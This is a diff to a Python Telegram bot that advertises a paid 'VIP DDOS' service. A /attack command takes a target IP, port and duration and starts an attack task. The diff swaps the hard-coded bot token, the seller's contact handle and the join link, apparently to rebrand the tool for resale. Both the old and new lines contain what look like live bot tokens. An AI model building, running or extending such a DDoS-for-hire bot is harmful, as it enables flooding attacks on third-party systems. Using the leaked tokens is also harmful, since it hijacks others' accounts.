@@ -3,7 +3,7 @@ import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7708846625:AAG-0MmKDbkG91aUUc9r7VVYUxAgF1we49c'
+TELEGRAM_BOT_TOKEN = '7620494708:AAHvLioujUgSNjv8GnV5JpNZaKSxKZqgNLg'
 ADMIN_USER_ID = 5142603617
 USERS_FILE = 'users.txt'
 LOG_FILE = 'log.txt'
@@ -71,7 +71,7 @@ async def start(update: Update, context: CallbackContext):
     message = (
         "*❤️Welcome to the RANBAL VIP DDOS ❤️*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
-        "* DM TO BUY :- @MrRanDom8 *"
+        "* DM TO BUY :- @sweety20_200 *"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -191,7 +191,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*⚔️ Attack Launched! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Join :- https://t.me/MrRanDom8DDOS 💥*"
+        f"*🔥 Join : https://t.me/+_vSOGI0JjJ4wM2U1 💥*"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
